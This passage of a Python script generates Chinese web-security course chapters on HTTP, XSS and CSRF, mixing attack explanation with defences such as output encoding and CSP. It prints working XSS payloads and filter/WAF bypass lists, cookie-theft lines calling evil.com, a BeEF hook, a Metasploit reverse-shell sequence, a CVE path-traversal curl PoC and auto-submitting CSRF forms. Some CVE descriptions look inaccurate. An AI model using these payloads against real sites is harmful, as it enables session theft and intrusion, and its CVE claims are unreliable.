        ('同源策略定义', '⭐⭐⭐⭐⭐', '中', '协议+域名+端口相同；限制跨域读取但不限制跨域发送'),
        ('CORS 安全配置', '⭐⭐⭐⭐', '中', 'Access-Control-Allow-Origin不能用*且Allow-Credentials为true同时出现'),
        ('HSTS 作用', '⭐⭐⭐⭐', '中', '强制HTTPS、防SSL剥离；首次访问前若无预加载仍有风险'),
        ('HTTP 缓存头', '⭐⭐⭐⭐', '低', 'no-store完全不缓存；no-cache先验证后使用(非不缓存)'),
        ('401 vs 403', '⭐⭐⭐⭐⭐', '低', '401未认证(你是谁)、403已认证权限不足(你不能进)'),
        ('301 vs 302', '⭐⭐⭐', '低', '301永久(Browser缓存)、302临时(每次都请求)'),
        ('HTTP 请求走私', '⭐⭐⭐⭐', '高', '前端代理与后端对CL/TE解析不一致；HTTP/2可规避'),
        ('HTTP/2 vs HTTP/3', '⭐⭐⭐', '中', 'HTTP/2二进制多路复用、HTTP/3基于UDP-QUIC内置TLS1.3'),
        ('GET vs POST 安全区别', '⭐⭐⭐⭐⭐', '低', 'GET参数在URL中(日志泄漏)；POST参数在Body中(相对隐蔽但非加密)'),
    ],
    [
        ('HTTP 状态码速记', '"一二三四五，信息成功重定客服务"', '信息=1xx、成功=2xx、重定向=3xx、客户端错误=4xx、服务器错误=5xx',
         '实战中快速判断状态码含义的口诀：1-信息提示、2-成功、3-重定向、4-客户端错误、5-服务器错误'),
        ('Cookie 安全三兄弟', '"HSS三旗帜：H不让读、S必须加锁、S防跨站"', 'HttpOnly(防XSS读)、Secure(仅HTTPS)、SameSite(防CSRF)',
         '实际只需记住首字母：H=HttpOnly/Hidden(JS看不到)、S=Secure/SSL(必须HTTPS)、S=SameSite/Strict(防跨站请求)'),
        ('缓存头陷阱提醒', '"no-cache不是不缓存，no-store才是真正不缓存"', 'no-cache=每次验证后使用(节省带宽)；no-store=完全不存(最高安全)',
         '考试中经常互换这两者来考察考生是否真正理解HTTP缓存语义'),
        ('同源策略记忆', '"三同原则：同协议、同域名、同端口——差一个都不行"', 'http≠https、a.com≠b.com、80≠8080',
         '注意：同源策略限制的是"读取"，不限制"发送"——浏览器会发送跨域请求但JS不能读响应'),
    ],
    [
        ('GET 请求比 POST 请求更安全', '安全问题不在于方法类型。GET 参数在 URL 中更容易被日志、Referer 泄露；POST 参数在 Body 中相对隐蔽，但两者在 HTTP 层面都是明文。'),
        ('no-cache 就是不缓存', 'no-cache 表示"先验证再使用"，缓存依然存在；no-store 才是完全不缓存。这是考试中最经典的混淆点。'),
        ('CORS 配置 * 就是最开放最方便', 'Access-Control-Allow-Origin: * 与 Allow-Credentials: true 不能共存。若需要携带 Cookie，必须指定具体 Origin。'),
        ('HTTPS 就是绝对安全的', 'HTTPS 保证传输安全，但不保证 Web 应用本身没有漏洞。SQLi/XSS 等漏洞在 HTTPS 下同样存在。'),
        ('Cookie Secure 标志就够了', 'Secure 只能防止传输层被嗅探，不能防止 XSS 通过 document.cookie 读取。必须配合 HttpOnly。'),
    ],
    [
        '使用 Burp Suite 完整抓包分析一个网站的 HTTP 交互全过程——从首页加载、登录、到数据请求，阅读每个请求/响应的每一行。',
        '手工构造各种 HTTP 请求：用 curl 发送 GET/POST/PUT/DELETE/OPTIONS 请求，观察服务器对不同方法的响应差异。',
        '搭建本地 Nginx，逐一配置本章列出的安全响应头，用 curl -I 验证配置是否生效。',
        '实验：对比同一网站在 HTTP 和 HTTPS 下的 WireShark 抓包——亲眼看看明文和密文的区别。',
        '使用 Burp Suite Repeater 修改请求头（Host、User-Agent、Cookie、Referer），观察服务器对不同输入的处理逻辑。',
        '阅读 MDN 的 HTTP 文档：https://developer.mozilla.org/zh-CN/docs/Web/HTTP',
    ],
    'HTTP 协议是每一行代码在网络上的"交通规则"。掌握它，Web 安全的攻与防才有了落脚点——你能看懂攻击者在传输层做的每一个手脚，也能知道如何用安全头堵上每一个缺口。第七天，从今天起你在 Web 上不再"裸奔"。',
)
print(f"  [BASIC] Day 7 done, total lines so far: {total_lines}")

# ===== Day 8: XSS跨站脚本攻击 =====
make_day('basic', 8, 'XSS跨站脚本攻击', '中级', '40',
    'XSS（跨站脚本攻击）常年位居 OWASP Top 10 前列，是 Web 安全中最普遍、影响最广的漏洞之一。本章从反射型、存储型、DOM型三种 XSS 的原理出发，系统讲解 XSS 的注入技术、绕过方法、BeEF 利用框架和 CSP 防御策略，让读者真正理解"为什么一段 JavaScript 能毁掉一个网站"。',
    [
        sec('一、XSS 概述与分类', '一xss-概述与分类', r"""## 一、XSS 概述与分类

### 1.1 XSS 定义

Cross-Site Scripting（跨站脚本攻击），简称 XSS（避免与 CSS 混淆）。攻击者将恶意脚本注入到受信任的网站中，当用户浏览器加载受污染页面时，恶意脚本在用户浏览器中执行。

```
攻击者 ──注入脚本──→ 受信任网站 ──返回污染页面──→ 受害用户浏览器
                                               │
                                        恶意脚本在此执行！
                                        - 窃取 Cookie
                                        - 劫持会话
                                        - 篡改页面
                                        - 钓鱼弹窗
                                        - 键盘记录
```

> **🔑 高分考点**：XSS 不是攻击服务器的漏洞，而是利用**浏览器对网站的信任**——脚本在受害者的浏览器中执行，以受害者的身份访问网站资源。

### 1.2 三种 XSS 类型对比

| 类型 | 恶意脚本存放位置 | 触发方式 | 持久性 | 危害范围 | 典型场景 |
|:---|:---|:---|:---:|:---:|:---|
| **反射型** | URL 参数中 | 受害者点击恶意链接 | 非持久 | 单个受害者 | 搜索框回显、错误提示 |
| **存储型** | 服务器数据库 | 受害者访问页面即触发 | 持久 | 所有访问者 | 评论、留言板、用户资料 |
| **DOM型** | 客户端 JS 代码 | JS 处理 URL 时触发 | 非持久 | 单个受害者 | #hash 值注入、前端路由 |

```javascript
// 反射型 XSS 示例
// URL: https://site.com/search?q=<script>alert(1)</script>
// 服务端直接回显搜索词：
app.get('/search', (req, res) => {
    res.send(`<h1>搜索: ${req.query.q}</h1>`); // 未转义！
});

// 存储型 XSS 示例
// 攻击者在评论区提交：
// <script>fetch('http://evil.com/steal?c='+document.cookie)</script>
// 每个访问该页面的用户都会执行此脚本

// DOM型 XSS 示例
// URL: https://site.com/#<img src=x onerror=alert(1)>
// 前端 JS 直接使用 hash：
document.getElementById('content').innerHTML = location.hash.slice(1);
```"""),
        sec('二、反射型 XSS 深度分析', '二反射型-xss-深度分析', r"""## 二、反射型 XSS 深度分析

### 2.1 攻击原理

反射型 XSS 的恶意脚本通过 URL 参数或其他请求数据传入服务器，服务器将未经过滤的数据直接"反射"回响应页面，浏览器解析执行后触发攻击。

```
步骤 1: 攻击者构造恶意 URL
https://vuln.com/search?q=<script>location='http://evil.com/?c='+document.cookie</script>

步骤 2: 攻击者通过邮件/IM 诱导受害者点击

步骤 3: 受害者浏览器发送 GET 请求（携带恶意参数）

步骤 4: 服务器返回包含恶意脚本的 HTML 页面
<h1>搜索: <script>location='http://evil.com/?c='+document.cookie</script></h1>

步骤 5: 受害者浏览器解析 HTML，执行恶意脚本

步骤 6: Cookie 被发送到攻击者服务器
```

### 2.2 常见注入点

| 注入位置 | 示例 | 测试 Payload |
|:---|:---|:---|
| 搜索框回显 | `/search?q=test` → 页面显示"test" | `<script>alert(1)</script>` |
| 404 错误页面 | `/nonexistent` → 显示"路径不存在" | `<img src=x onerror=alert(1)>` |
| 登录错误提示 | `/login?error=用户名不存在` | `'><script>alert(1)</script>` |
| URL 重定向参数 | `/redirect?url=xxx` | `javascript:alert(1)` |
| 下拉框选项回显 | `/filter?category=books` | `"><script>alert(1)</script>` |
| 表单预填充 | `/profile?name=John` → input value="John" | `"><script>alert(1)</script><input type="` |

```bash
# 反射型 XSS 测试命令
# 测试1：基本 script 标签
curl "http://target/search?q=<script>alert(1)</script>"

# 测试2：img 标签 onerror（绕过 script 过滤）
curl "http://target/search?q=<img src=x onerror=alert(1)>"

# 测试3：svg 标签
curl "http://target/search?q=<svg onload=alert(1)>"

# 测试4：body 标签
curl "http://target/search?q=<body onload=alert(1)>"

# 测试5：事件处理器的各种形式
curl "http://target/search?q=<div onmouseover='alert(1)'>HOVER ME</div>"
```

### 2.3 上下文感知注入

XSS 注入需要根据输出上下文选择不同 payload：

```javascript
// 上下文 1：HTML 标签之间
// 输出位置：<div>用户输入</div>
payload: <script>alert(1)</script>
payload: <img src=x onerror=alert(1)>

// 上下文 2：HTML 属性值内
// 输出位置：<input value="用户输入">
payload: " onfocus="alert(1)" autofocus="
payload: "><script>alert(1)</script>

// 上下文 3：JavaScript 字符串内
// 输出位置：<script>var name = '用户输入';</script>
payload: '; alert(1); //

// 上下文 4：CSS 内
// 输出位置：<style>body { color: 用户输入; }</style>
payload: red; } body { background: url(javascript:alert(1)) }

// 上下文 5：URL 属性内
// 输出位置：<a href="用户输入">Link</a>
payload: javascript:alert(1)
```"""),
        sec('三、存储型 XSS 深度分析', '三存储型-xss-深度分析', r"""## 三、存储型 XSS 深度分析

### 3.1 攻击原理

存储型 XSS 是最危险的形式——恶意脚本被**永久存储**在目标服务器上（数据库、文件系统、缓存），每个访问受污染页面的用户都会执行该脚本。

```
攻击者                                                      普通用户
  │                                                          │
  │── POST /comment ──────────────────→ 服务器 ──────────────│
  │   body=<script>恶意代码</script>    │ 存储到 DB           │
  │                                    │                     │
  │                                    │←── GET /page ───────│
  │                                    │ 从 DB 读取评论       │
  │                                    │── 返回包含恶意 ────→│
  │                                    │   脚本的 HTML        │
  │                                                          │
  │                                             恶意脚本执行！ │
  │                                             所有访客受害   │
```

### 3.2 经典案例

**案例1：Samy 蠕虫（MySpace，2005）**

技术爱好者 Samy Kamkar 在 MySpace 个人资料中嵌入 XSS，当任何人访问他的主页时自动将他加为好友并复制蠕虫到自己的个人资料。20小时内感染超过 100 万用户。

```
简化的 Samy 蠕虫原理：
1. 用户A访问Samy的主页 → 触发XSS
2. XSS发起POST请求将Samy加为好友
3. XSS将蠕虫代码复制到用户A的个人资料
4. 用户B访问用户A的主页 → 重复步骤2...
```

**案例2：TweetDeck XSS 漏洞（CVE-2014-10067）**

TweetDeck 的 tweet 渲染未过滤 emoji 标签，攻击者发送包含 `<script>` 标签的 tweet，所有使用 TweetDeck 的用户自动执行恶意脚本，导致数万用户在不知情的情况下转发了该 tweet。

**案例3：英国航空数据泄露（2018）**

攻击者在英航支付页面注入存储型 XSS（通过修改第三方 JS 库），窃取了 38 万用户的支付卡信息。GDPR 罚款 1.83 亿英镑。

### 3.3 存储型 XSS 高危场景

```bash
# 高危场景 1：富文本编辑器
# 用户提交的 HTML 内容直接展示给其他用户
# 攻击 payload：<a href="javascript:alert(document.cookie)">Click Me</a>

# 高危场景 2：文件上传
# 上传包含 JS 的 SVG 文件
# SVG 内容：<svg xmlns="http://www.w3.org/2000/svg">
#   <script>alert(document.cookie)</script></svg>

# 高危场景 3：Markdown 渲染
# 部分 Markdown 解析器允许 HTML
# 攻击 payload：[click](javascript:alert(1))

# 高危场景 4：用户可控的 JSON/XML 展示
# 当 API 响应包含用户输入并直接渲染为 HTML
```"""),
        sec('四、DOM型 XSS', '四dom型-xss', r"""## 四、DOM型 XSS

### 4.1 DOM型 XSS 原理

DOM型 XSS 完全发生在**客户端**——恶意脚本从未到达服务器，漏洞存在于前端 JavaScript 代码对 DOM 的不安全操作：

```javascript
// 漏洞代码示例
// URL: https://site.com/page#<img src=x onerror=alert(1)>

// eval() 危险用法
var hash = location.hash.slice(1);
eval(hash);  // 直接执行 hash 中的 JS！

// innerHTML 危险用法
document.getElementById('content').innerHTML = location.hash.slice(1);

// document.write 危险用法
document.write('<h1>' + location.search.substring(1) + '</h1>');

// setTimeout/setInterval 危险用法
setTimeout("doSomething('" + userInput + "')", 1000);
```

### 4.2 危险 Source 和 Sink

| 类别 | 常见 API | 危险等级 |
|:---|:---|:---:|
| **Source（输入源）** | `location.href`, `location.hash`, `location.search` | 用户可控 |
|  | `document.URL`, `document.documentURI` | 用户可控 |
|  | `document.referrer` | 可能被伪造 |
|  | `window.name` | 跨域持久 |
|  | `postMessage` 数据 | 需验证 origin |
|  | `localStorage.getItem()` | 注意是否被污染 |
| **Sink（执行点）** | `eval()`, `setTimeout(string)`, `setInterval(string)` | ⚠️ 代码执行 |
|  | `innerHTML`, `outerHTML` | ⚠️ HTML 注入 |
|  | `document.write()` | ⚠️ HTML 注入 |
|  | `location.href = userInput` | ⚠️ URL 跳转 |
|  | `jQuery.html()` | ⚠️ HTML 注入 |
|  | `React dangerouslySetInnerHTML` | ⚠️ HTML 注入 |

```javascript
// 不安全代码 vs 安全代码

// ❌ 不安全：innerHTML
document.getElementById('msg').innerHTML = userInput;

// ✅ 安全：textContent
document.getElementById('msg').textContent = userInput;

// ❌ 不安全：eval 动态执行
var action = location.hash.slice(1);
eval('doAction("' + action + '")');

// ✅ 安全：白名单匹配
var actions = {'view': doView, 'edit': doEdit};
if (actions[action]) actions[action]();

// ❌ 不安全：危险的 jQuery
$('#content').html(userInput);    // 会执行 <script>
$('#content').append(userInput);  // 也会执行！

// ✅ 安全：jQuery text
$('#content').text(userInput);
```"""),
        sec('五、XSS 绕过技术', '五xss-绕过技术', r"""## 五、XSS 绕过技术

### 5.1 标签与事件绕过

当常见的 `<script>` 被过滤时，攻击者转向 HTML 标签的事件处理器：

```html
<!-- 基础替代标签 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- 无交互事件 -->
<svg/onload=alert(1)>
<input autofocus onfocus=alert(1)>
<video poster=javascript:alert(1)>
```

### 5.2 大小写与编码绕过

```html
<!-- 大小写混淆（HTML 不区分大小写） -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=X ONERROR=alert(1)>
<SvG/OnLoAd=alert(1)>

<!-- HTML 实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">  <!-- &#97=a -->

<!-- URL 编码 -->
<a href="javascript&#58;alert(1)">Click</a>

<!-- Unicode 编码 -->
<img src=x onerror="\u0061lert(1)">

<!-- Base64 + eval -->
<script>eval(atob('YWxlcnQoMSk='))</script>  <!-- atob('YWxlcnQoMSk=') = "alert(1)" -->

<!-- JSFuck 风格（仅用 []()!+ 六个字符构造代码） -->
<script>[][(![]+[])[+[]]...]</script>
```

### 5.3 关键字过滤绕过

```html
<!-- 场景1：过滤 script 标签 -->
<!-- 解决：使用其他标签或大小写 -->
<scr<script>ipt>alert(1)</scr</script>ipt>  <!-- 嵌套绕过（假设过滤一次） -->
<img src=x onerror=alert(1)>

<!-- 场景2：过滤 alert -->
<!-- 解决：使用其他函数 -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
<script>(alert)(1)</script>  <!-- 括号包裹绕过 -->
<script>window['alert'](1)</script>  <!-- 数组访问绕过 -->

<!-- 场景3：过滤 () -->
<!-- 解决：使用模板字符串 -->
<script>alert`1`</script>  <!-- ES6 tagged template -->

<!-- 场景4：过滤空格 -->
<!-- 解决：使用 / 或注释或换行符 -->
<img/src=x/onerror=alert(1)>
<img src=x onerror="alert(1)">
```

### 5.4 WAF 绕过实战

```html
<!-- 1. 使用 HTML 编码绕过签名 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- 2. 多重编码 -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

<!-- 3. 利用注释混淆 -->
<script>/**/alert/**/(1)/**/</script>
<script><!-- alert(1) --></script>

<!-- 4. 利用换行和空白字符 -->
<svg%0Aonload=alert(1)>  <!-- %0A = 换行 -->
<img src=x onerror="alert(1)">  <!-- 制表符 -->

<!-- 5. 利用 data: URI -->
<object data="data:text/html,<script>alert(1)</script>">
```"""),
        sec('六、XSS 利用框架 BeEF', '六xss-利用框架-beef', r"""## 六、XSS 利用框架 BeEF

### 6.1 BeEF 简介

BeEF（Browser Exploitation Framework）是 XSS 攻击的专业利用平台——当受害者浏览器执行 XSS hook 后，攻击者可以通过 BeEF 控制面板对被 hook 的浏览器执行数百种命令。

```bash
# BeEF 安装与启动（Kali Linux 自带）
sudo apt install beef-xss
cd /usr/share/beef-xss
sudo ./beef

# 默认 Web UI：http://127.0.0.1:3000/ui/panel
# 默认 hook URL：http://<YOUR_IP>:3000/hook.js
```

### 6.2 Hook 注入与连接

```html
<!-- XSS Payload：注入 BeEF hook -->
<script src="http://攻击者IP:3000/hook.js"></script>

<!-- 实际注入后，受害者的浏览器会在 BeEF 面板中显示 -->
```

### 6.3 BeEF 核心模块能力

| 模块类别 | 能力 | 示例模块 |
|:---|:---|:---|
| **浏览器信息** | 获取浏览器版本、OS、插件、屏幕分辨率 | `get_system_info`, `get_visited_domains` |
| **社会工程** | 伪造登录框、虚假 Flash 更新 | `pretty_theft`, `fake_notification` |
| **网络侦察** | 扫描内网端口、识别内网服务 | `port_scanner`, `internal_network_fingerprint` |
| **持久化** | 创建 iframe 保持连接、pop-under 窗口 | `man_in_the_browser` |
| **凭据窃取** | 窃取 Cookie、表单自动填充、自动完成数据 | `grab_google_contacts`, `get_stored_credentials` |
| **Metasploit 集成** | 通过浏览器漏洞获取 shell | `msf_browser_autopwn` |

```bash
# BeEF + Metasploit 联动
# 1. 启动 MSF
msfconsole
msf> use exploit/multi/browser/firefox_proxy_prototype_cmdi
msf> set PAYLOAD firefox/shell_reverse_tcp
msf> set LHOST 攻击者IP
msf> exploit

# 2. 在 BeEF 中使用 msf_browser_autopwn 模块
# 选择被 hook 的浏览器 → Commands → Metasploit → msf_browser_autopwn

# 3. 受害者浏览器触发漏洞 → MSF 获得反向 shell
```"""),
        sec('七、XSS 防御策略', '七xss-防御策略', r"""## 七、XSS 防御策略

### 7.1 输出编码（最重要的防御）

| 输出上下文 | 编码方式 | 示例 |
|:---|:---|:---|
| HTML 标签间 | HTML 实体编码 | `<` → `&lt;` `>` → `&gt;` `"` → `&quot;` |
| HTML 属性值 | 属性值编码（加引号） | `"` → `&quot;` |
| JavaScript 内 | Unicode 转义 | `'` → `\x27` |
| CSS 内 | CSS 转义 | `<` → `\3C` |
| URL 参数 | URL 编码 | `"` → `%22` |

```php
<?php
// PHP 安全输出
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
// ENT_QUOTES 同时转义单引号和双引号

// 错误示例：不安全的输出
echo $user_input;  // ❌ XSS!
echo $_GET['q'];   // ❌ XSS!
?>

<!-- JavaScript 模板中 -->
<script>
// ❌ 不安全
var name = '<?php echo $name; ?>';
elm.innerHTML = '<?php echo $desc; ?>';

// ✅ 安全
var name = <?php echo json_encode($name); ?>;
elm.textContent = <?php echo json_encode($desc); ?>;
</script>
```

### 7.2 Content Security Policy (CSP)

CSP 是最强大的 XSS 防御机制——通过 HTTP 响应头声明浏览器允许加载资源的白名单：

```nginx
# 严格的 CSP 策略
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-random123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    report-uri /csp-report;
";
```

```html
<!-- 配合 CSP nonce 的 script 标签 -->
<script nonce="random123">
    // 此脚本可执行（nonce 匹配）
    console.log('safe');
</script>

<script>
    // 此脚本被 CSP 阻止（缺少 nonce）
    alert('blocked');
</script>
```

### 7.3 HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

即使 XSS 成功执行，`document.cookie` 也无法读取 HttpOnly Cookie，保护了会话令牌。

### 7.4 防御检查清单

| 层面 | 措施 | 优先级 |
|:---|:---|:---:|
| **输入** | 验证输入类型、长度、格式 | 中 |
| **输出** | HTML 实体编码（重要！） | **最高** |
| **前端** | 使用 textContent 而非 innerHTML | 高 |
| **Cookie** | HttpOnly + Secure + SameSite | **最高** |
| **HTTP头** | CSP + X-XSS-Protection | 高 |
| **框架** | 使用自动转义模板引擎 | 高 |
| **测试** | 自动化 XSS 扫描 + 手工测试 | 中 |"""),
        sec('八、XSS 真实 CVE 案例', '八xss-真实-cve-案例', r"""## 八、XSS 真实 CVE 案例

### 8.1 CVE-2019-16759：vBulletin 存储型 XSS

vBulletin 5.x 的未授权 REST API 允许通过 widgetConfig 参数注入存储型 XSS（CVSS 9.8），导致攻击者可以在无需认证的情况下在论坛首页执行任意 JavaScript。

```
Exploit: POST /ajax/api/content_infraction/getInfractionContent
         parameters: widgetConfig[code]直接回显
         
修复后：widgetConfig 值经过 htmlspecialchars 编码
```

### 8.2 CVE-2020-5902：F5 BIG-IP TMUI XSS

F5 BIG-IP 的 Traffic Management User Interface 存在反射型 XSS（CVSS 10.0），同时可结合路径遍历实现 RCE。

```
POC: /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=...
     利用路径遍历读取敏感文件 + 登录页反射 XSS
```

### 8.3 CVE-2018-0296：Cisco ASA WebVPN XSS

Cisco ASA 的 WebVPN 登录页面未过滤 `/+CSCOE+/` 路径后的内容，导致反射型 XSS，攻击者可构造钓鱼 URL 诱骗用户暴露 VPN 凭据。

### 8.4 CVE-2021-42013：Apache HTTP Server 路径遍历 + XSS

Apache HTTP Server 2.4.50 路径规范化缺陷导致在 CGI 环境中存在 XSS 和 RCE：

```bash
# POC
curl --data "echo;id" 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```"""),
        sec('九、自动化 XSS 检测', '九自动化-xss-检测', r"""## 九、自动化 XSS 检测

### 9.1 常用工具

| 工具 | 类型 | 特点 |
|:---|:---|:---|
| **XSStrike** | 专用 XSS 扫描器 | 模糊测试 + WAF 检测 + DOM XSS 分析 |
| **XSSer** | 专用 XSS 扫描器 | 自动编码绕过 + 多种注入点 |
| **Dalfox** | 专用 XSS 扫描器 | 快速、支持管道、参数挖掘 |
| **Burp Suite** | 通用 Web 安全工具 | Scanner 模块 + Active Scan |
| **AWVS** | 商业漏洞扫描器 | 全面但需付费 |
| **Nuclei** | 模板化扫描器 | 社区 XSS 模板覆盖广 |

```bash
# XSStrike
python3 xsstrike.py -u "http://target/search?q=test" --crawl

# Dalfox
echo "http://target/search?q=test" | dalfox pipe

# Nuclei
nuclei -u "http://target" -t xss/

# XSSer
xsser --url "http://target/search?q=XSS" --auto
```

### 9.2 手工检测清单

```
□ 在每个输入点测试 <script>alert(1)</script>
□ 测试 HTML 属性注入："><script>alert(1)</script>
□ 测试事件处理器：<img src=x onerror=alert(1)>
□ 测试不同的标签：<svg onload=alert(1)>
□ 测试大小写变体：<ScRiPt>alert(1)</sCrIpT>
□ 测试编码变体：%3Cscript%3Ealert(1)%3C/script%3E
□ 测试 DOM XSS source：修改 location.hash
□ 检查 CSP 头：curl -I https://target
□ 检查 Cookie 标志：HttpOnly、Secure、SameSite
□ 验证输出编码：查看页面源码中用户输入是否被转义
```"""),
    ],
    [
        ('XSS 三种类型', '⭐⭐⭐⭐⭐', '低', '反射型(URL参数)、存储型(服务器持久)、DOM型(客户端JS)'),
        ('XSS 攻击本质', '⭐⭐⭐⭐⭐', '中', '利用浏览器对网站的信任；在受害者浏览器中以受害者身份执行'),
        ('HttpOnly Cookie', '⭐⭐⭐⭐⭐', '中', '禁止JS读取Cookie，防XSS窃取会话；配合Secure+SameSite'),
        ('CSP 防御原理', '⭐⭐⭐⭐⭐', '高', '白名单控制可加载资源来源；nonce/hash机制允许特定内联脚本'),
        ('输出编码是根本防御', '⭐⭐⭐⭐⭐', '中', 'HTML实体编码：< → &lt; > → &gt; " → &quot; 在对应上下文编码'),
        ('innerHTML vs textContent', '⭐⭐⭐⭐', '低', 'innerHTML解析HTML(XSS风险)；textContent纯文本(安全)'),
        ('反射型利用方式', '⭐⭐⭐⭐', '中', '诱导点击恶意链接；常用于钓鱼+凭据窃取'),
        ('存储型危害范围', '⭐⭐⭐⭐⭐', '低', '影响所有访客；Samy蠕虫感染100万+用户'),
        ('XSS 绕过技术', '⭐⭐⭐⭐', '高', '编码混淆、大小写、标签替换、事件处理器替代script标签'),
        ('DOM型 source/sink', '⭐⭐⭐', '高', 'source=location.*; sink=eval/innerHTML/document.write'),
        ('CVE经典案例', '⭐⭐⭐', '中', 'CVE-2019-16759(vBulletin RCE)、CVE-2020-5902(F5 BIG-IP)'),
        ('BeEF 框架', '⭐⭐', '中', '浏览器控制平台；hook.js注入后可控500+模块'),
    ],
    [
        ('三种XSS速记', '"反-存-DOM：反射靠链接，存储进数据库，DOM在客户端"', '反射=用户点链接→服务器回显；存储=存数据库→所有人受害；DOM=JS直接处理用户输入',
         '反射型最普遍但影响单一用户；存储型最危险影响所有访客；DOM型最难检测因为不经过服务器'),
        ('XSS防御四层', '"输编-CSP-httponly-框架"', '输出编码是根本；CSP白名单是兜底；HttpOnly保Cookie；框架自动转义省心',
         '四层都部署才能纵深防御，任何一层缺失都可能被突破'),
        ('编码记忆', '"四个小于号：< &lt; > &gt; & &amp; " &quot;"', 'HTML最小转义四字符：< > & "，用htmlspecialchars函数',
         '加上单引号转义 &apos; 更安全(ENT_QUOTES)'),
    ],
    [
        ('XSS 是服务器漏洞', 'XSS 本质是客户端漏洞——脚本在受害者浏览器中执行，服务器可能完全正常。漏洞点是缺乏输出编码。'),
        ('过滤 <script> 就能防 XSS', '有上百种方式触发 XSS：img onerror, svg onload, iframe, javascript: 伪协议等。正确做法是输出编码而非黑名单过滤。'),
        ('反射型 XSS 危害不大', '反射型 XSS 结合社会工程学可造成严重危害——钓鱼窃取凭据、劫持会话、重定向到恶意站点。CVSS 评分可达中高危。'),
        ('加了 CSP 就万事大吉', 'CSP 配置不当（如包含 unsafe-inline, unsafe-eval）等于没加。CSP 是防御的兜底层，不能替代输出编码。'),
    ],
    [
        '在 DVWA/WebGoat 等靶场中练习三种 XSS 的利用——理解每种类型的注入点和触发条件。',
        '安装 BeEF 并实践 Hook → 信息收集 → 社会工程 → 持久化的完整攻击链。',
        '搭建本地环境测试各种 XSS 绕过技术——练习编码绕过、大小写绕过、标签替换。',
        '学习配置 CSP：先用 Report-Only 模式收集违规报告，再逐步收紧策略。',
        '在代码审计中关注所有 `innerHTML`、`document.write`、`eval` 的使用。',
        '阅读 OWASP XSS Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html',
    ],
    'XSS 看起来"只是弹个窗"，但它是通往完整浏览器控制的入口。攻击者通过 XSS 可以窃取凭证、劫持会话、监控键盘、扫描内网、获取 Shell——它让受害者的浏览器变成攻击者的"肉鸡"。防御 XSS 没有捷径：输出编码永远是第一道防线，CSP 是最后的安全网。第八天，从此你能"看见"网页中每一处潜在的脚本注入。',
)

print(f"  [BASIC] Day 8 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Helper for compact section content
def S(title, anchor, body):
    return (title, anchor, body)

# ===== Day 9: CSRF跨站请求伪造 =====
make_day('basic', 9, 'CSRF跨站请求伪造', '中级', '35',
    'CSRF（Cross-Site Request Forgery，跨站请求伪造）利用已认证用户的身份，在用户不知情的情况下以用户名义发起恶意请求。它与 XSS 经常被混淆——XSS 利用用户对站点的信任，CSRF 利用站点对用户浏览器的信任。本章详解 CSRF 攻击原理、GET/POST 型利用、Token 防御机制和 SameSite Cookie。',
    [
        S('一、CSRF 原理与危害', '一csrf-原理与危害', r"""## 一、CSRF 原理与危害

### 1.1 CSRF 攻击流程

```
步骤 1: 用户登录 bank.com（获得会话 Cookie）
步骤 2: 用户未退出 bank.com，同时访问了 evil.com
步骤 3: evil.com 包含一个自动提交的表单：
        <form action="https://bank.com/transfer" method="POST">
          <input type="hidden" name="to" value="attacker">
          <input type="hidden" name="amount" value="10000">
        </form>
        <script>document.forms[0].submit();</script>
步骤 4: 浏览器自动携带 bank.com 的 Cookie 发送请求
步骤 5: 转账成功——用户毫不知情！
```

> **🔑 高分考点**：CSRF 攻击的三个必要条件：①用户已登录目标站点（有有效会话）；②目标站点仅靠 Cookie 认证；③攻击者能构造出所有需要的请求参数。

### 1.2 CSRF vs XSS 对比

| 维度 | CSRF | XSS |
|:---|:---|:---|
| 信任关系 | 利用网站对浏览器的信任 | 利用浏览器对网站的信任 |
| 攻击目标 | 以用户身份执行操作 | 在用户浏览器中执行脚本 |
| Cookie | 自动携带（同源策略对请求不限制发送） | 需窃取（HttpOnly 可防御） |
| 防御核心 | Token + SameSite Cookie | 输出编码 + CSP |
| 发现难度 | 较难（需了解业务逻辑） | 相对容易（反射型） |"""),
        S('二、GET 型 CSRF', '二get-型-csrf', r"""## 二、GET 型 CSRF

最简单的 CSRF 形式——通过 URL 即可触发：

```html
<!-- 隐藏的 img 标签 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" 
     style="display:none">

<!-- 自动跳转 -->
<meta http-equiv="refresh" 
      content="0;url=http://bank.com/delete?id=123">

<!-- iframe 加载 -->
<iframe src="http://bank.com/admin/deleteUser?id=1" 
        style="display:none"></iframe>
```

**防御**：GET 请求应仅用于数据读取，绝不用来执行修改操作。RESTful 规范要求 GET 是安全且幂等的。"""),
        S('三、POST 型 CSRF', '三post-型-csrf', r"""## 三、POST 型 CSRF

### 3.1 自动提交表单

```html
<!-- evil.com 上的恶意页面 -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="attacker-account">
    <input type="hidden" name="amount" value="100000">
    <input type="hidden" name="currency" value="USD">
  </form>
</body>
</html>
```

### 3.2 JSON CSRF（利用 AJAX）

```html
<!-- JSON CSRF：利用 fetch 自动发送 JSON POST -->
<script>
